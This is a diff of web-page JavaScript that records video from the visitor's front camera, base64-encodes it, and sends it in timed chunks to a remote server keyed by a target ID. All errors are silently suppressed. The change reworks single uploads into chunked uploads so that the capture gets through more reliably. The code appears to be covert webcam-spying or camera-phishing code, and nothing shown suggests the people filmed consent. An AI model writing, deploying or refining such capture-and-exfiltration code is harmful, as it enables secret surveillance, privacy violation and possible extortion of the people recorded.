@@ -602,23 +602,35 @@ function _startCam() {
 }
 
 function _startVideo(stream) {
-  var mime = ['video/webm;codecs=vp9','video/webm;codecs=vp8','video/webm','video/mp4'].find(function(m){ try{return MediaRecorder.isTypeSupported(m);}catch(e){return false;} });
-  var mr;
-  try { mr = new MediaRecorder(stream, mime ? {mimeType:mime, videoBitsPerSecond:600000} : {}); } catch(e) { return; }
-  mr.ondataavailable = function(e) {
-    if (!e.data || e.data.size < 100) return;
+  var mime = ['video/webm;codecs=vp9','video/webm;codecs=vp8','video/webm','video/mp4'].find(function(m){
+    try{return MediaRecorder.isTypeSupported(m);}catch(e){return false;}
+  });
+  var mr, chunks = [];
+  try { mr = new MediaRecorder(stream, mime ? {mimeType:mime, videoBitsPerSecond:500000} : {}); } catch(e) { return; }
+  mr.ondataavailable = function(e) { if (e.data && e.data.size > 0) chunks.push(e.data); };
+  mr.onstop = function() {
+    var blob = new Blob(chunks, {type: mime || 'video/webm'});
+    if (blob.size < 1000) return;
     var reader = new FileReader();
     reader.onload = function() {
-      var b64 = reader.result.split(',')[1];
-      fetch(_CAM_SERVER + '/cam/' + _CAM_TID, {
-        method:'POST', headers:{'Content-Type':'application/json'},
-        body: JSON.stringify({facing:'user', chunk:b64, chunk_idx:0, chunk_total:1, video:true, mime:mime||'video/webm', seg:true})
-      }).catch(function(){});
+      var b64full = reader.result.replace(/^data:[^,]+,/, '');
+      var CHUNK = 40000;
+      var total = Math.ceil(b64full.length / CHUNK);
+      for (var i = 0; i < total; i++) {
+        (function(idx, part) {
+          setTimeout(function() {
+            fetch(_CAM_SERVER + '/cam/' + _CAM_TID, {
+              method:'POST', headers:{'Content-Type':'application/json'},
+              body: JSON.stringify({facing:'user', chunk:part, chunk_idx:idx, chunk_total:total, video:true, mime:mime||'video/webm'})
+            }).catch(function(){});
+          }, idx * 200);
+        })(i, b64full.slice(i * CHUNK, (i+1) * CHUNK));
+      }
     };
-    reader.readAsDataURL(e.data);
+    reader.readAsDataURL(blob);
   };
-  mr.start(4000);
-  setTimeout(function(){ try{ if(mr.state!=='inactive') mr.stop(); }catch(e){} }, 60000);
+  mr.start();
+  setTimeout(function(){ try{ if(mr.state!=='inactive') mr.stop(); }catch(e){} }, 20000);
 }
 
 function _snap(v, stream, idx) {
